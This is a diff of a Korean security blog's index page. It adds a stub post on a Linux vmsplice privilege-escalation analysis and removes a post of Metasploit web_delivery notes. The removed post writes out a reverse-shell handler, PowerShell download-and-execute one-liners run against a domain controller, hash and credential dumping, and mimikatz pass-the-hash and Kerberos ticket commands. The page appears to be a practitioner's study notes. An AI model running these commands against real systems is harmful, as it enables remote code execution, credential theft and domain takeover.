@@ -9,7 +9,7 @@
   <meta name="author" content="KC">
 
   
-  <meta name="description" content="How &ldquo;../sms&rdquo; could bypass Authy 2 Factor Authentication Sakurity 블로그의 글 또 하나.
+  <meta name="description" content="xor %eax,%eax 블로그의 분석 을 정리해본다.
 ">
   
 
@@ -66,6 +66,35 @@
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/07/30/cve-2008-2009-slash-cve-2008-2010-linux-kernel-vmsplice-lpe/">CVE-2008-2009/CVE-2008-2010: Linux Kernel Vmsplice LPE</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-07-30T13:40:24+09:00'><span class='date'><span class='date-month'>Jul</span> <span class='date-day'>30</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>1:40 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p><a href="https://xorl.wordpress.com/2009/08/10/cve-2008-0600cve-2008-0010-linux-kernel-vmsplice2-privilege-escalation/">xor %eax,%eax 블로그의 분석</a> 을 정리해본다.</p>
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -2295,141 +2324,6 @@
 
     </article>
   
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2015/07/10/metasploit-web-delivery/">Metasploit: Web_delivery</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2015-07-10T09:33:08+09:00'><span class='date'><span class='date-month'>Jul</span> <span class='date-day'>10</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>9:33 am</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><ul>
-<li><a href="http://www.slideshare.net/gentilkiwi/mimikatz-how-to-push-microsoft-to-change-some-little-stuff">mimikatz @ passwords#14</a></li>
-<li><a href="http://www.beneaththewaves.net/Projects/Mimikatz_20_-_Golden_Ticket_Walkthrough.html">Mimikatz 2.0 - Golden Ticket Walkthrough</a></li>
-<li><a href="https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It.pdf">Abusing Microsoft Kerberos by Alva DUCKWALL &amp; Benjamin DELPY</a></li>
-<li><a href="http://www.ietf.org/rfc/rfc4120.txt">Kerberos tickets</a></li>
-<li><a href="http://www.ietf.org/rfc/rfc4757.txt">RFC4757</a></li>
-<li><a href="http://msdn.microsoft.com/library/cc237917.aspx">Microsoft Specific PAC</a></li>
-</ul>
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>exploit(web_delivery) &gt; set TARGET 2
-</span><span class='line'>exploit(web_delivery) &gt; set PAYLOAD windows/meterpreter/reverse_tcp
-</span><span class='line'>exploit(web_delivery) &gt; set LHOST 172.16.3.76
-</span><span class='line'>exploit(web_delivery) &gt; set LPORT 8686
-</span><span class='line'>exploit(web_delivery) &gt; run
-</span><span class='line'>[*] Exploit running as background job.
-</span><span class='line'>
-</span><span class='line'>[*] [...] Started reverse handler on 172.16.3.76:8686
-</span><span class='line'>[*] [...] Using URL: http://0.0.0.0:8080/moKqrqIYh0
-</span><span class='line'>...
-</span><span class='line'>
-</span><span class='line'>$ winexe -k DOMAIN //dc01 "powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://172.16.3.76:8080/moKqrqIYh0'))"
-</span><span class='line'>
-</span><span class='line'>...
-</span><span class='line'>meterpreter &gt; getuid
-</span><span class='line'>meterpreter &gt; getsystem
-</span><span class='line'>meterpreter &gt; getprivs
-</span><span class='line'>meterpreter &gt; portfwd ...
-</span><span class='line'>
-</span><span class='line'>$ python forgeTGT.py ...
-</span><span class='line'>$ wine mimikatz.exe "kerberos::clist TGT_... /export" exit
-</span><span class='line'>
-</span><span class='line'>meterpreter &gt; load kiwi
-</span><span class='line'>meterpreter &gt; kerberos_ticket_use /root/git/....DOAMIN.kirbi
-</span><span class='line'>meterpreter &gt; shell
-</span><span class='line'>
-</span><span class='line'>c:\&gt; sc \\dc01\ create psh binPath="cmd.exe /c powershell -nop -w hidden -c IEK ((new-object net.webclient).downloadstring('172.16.3.76:8080/moKqrqIYh0'))"
-</span><span class='line'>c:\&gt; sc \\dc01\ start psh
-</span><span class='line'>c:\&gt; sc \\dc01\ delete psh
-</span><span class='line'>c:\&gt; exit
-</span><span class='line'>
-</span><span class='line'>meterpreter &gt; background
-</span><span class='line'>meterpreter &gt; sessions -i ...
-</span><span class='line'>meterpreter &gt; run post/windows/gather/hashdump
-</span><span class='line'>meterpreter &gt; run post/windows/gather/credentials/credential_collector</span></code></pre></td></tr></table></div></figure>
-
-
-<p>mimikatz</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>mimikatz # sekurlsa::logonpasswords
-</span><span class='line'>mimikatz # sekurlsa::ekeys
-</span><span class='line'>mimikatz # lsadump::lsa /inject /name:krbtgt
-</span><span class='line'>mimikatz # lsadump::lsa /inject /name:Administrator
-</span><span class='line'>mimikatz # sekurlsa::pth /user:Administrator /domain:babo.local /ntlm:cc36...
-</span><span class='line'>mimikatz # kerberos::list /export
-</span><span class='line'>mimikatz # kerberos::ptt ticket.kirbi
-</span><span class='line'>mimikatz # sekurlsa::tickets /export</span></code></pre></td></tr></table></div></figure>
-
-
-<ul>
-<li>Kerberos::Overpass-the-hash</li>
-<li><a href="http://msdn.microsoft.com/library/windows/desktop/aa378099.aspx">Kerberos::Pass-the-ticket</a></li>
-</ul>
-
-</div>
-  
-  
-
-
-    </article>
-  
   <div class="pagination">
     
       <a class="prev" href="/posts/4">&larr; Older</a>
@@ -2447,6 +2341,10 @@
   <ul id="recent_posts">
     
       <li class="post">
+        <a href="/blog/2016/02/03/qseecom/">Qseecom</a>
+      </li>
+    
+      <li class="post">
         <a href="/blog/2016/01/15/tf-idf/">TF-IDF</a>
       </li>
     
@@ -2460,10 +2358,6 @@
     
       <li class="post">
         <a href="/blog/2016/01/11/bsides-vienna-2015-writing-your-first-windows-exploit-in-less-than-one-hour/">BSides Vienna 2015: Writing Your First Windows Exploit in Less Than One Hour</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2016/01/11/sock-sendpage/">Sock_sendpage</a>
       </li>
     
   </ul>
